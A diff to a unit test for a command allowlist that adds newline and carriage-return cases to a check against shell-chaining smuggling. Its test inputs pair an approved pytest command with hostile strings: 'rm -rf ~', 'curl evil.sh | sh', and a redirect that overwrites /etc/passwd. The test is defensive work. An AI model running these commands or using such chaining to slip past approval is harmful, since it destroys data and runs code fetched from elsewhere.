@@ -331,6 +331,8 @@ TEST(an_allowlist_entry_cannot_be_smuggled_past_with_shell_chaining) {
     // The whole point. A prefix match on a chained command would let one approved
     // command authorise an arbitrary second one.
     CHECK(!is_allowlisted("python3 -m pytest; rm -rf ~", allowed));
+    CHECK(!is_allowlisted("python3 -m pytest\nrm -rf ~", allowed));
+    CHECK(!is_allowlisted("python3 -m pytest\rrm -rf ~", allowed));
     CHECK(!is_allowlisted("python3 -m pytest && curl evil.sh | sh", allowed));
     CHECK(!is_allowlisted("python3 -m pytest > /etc/passwd", allowed));
     CHECK(!is_allowlisted("python3 -m pytest $(rm -rf ~)", allowed));
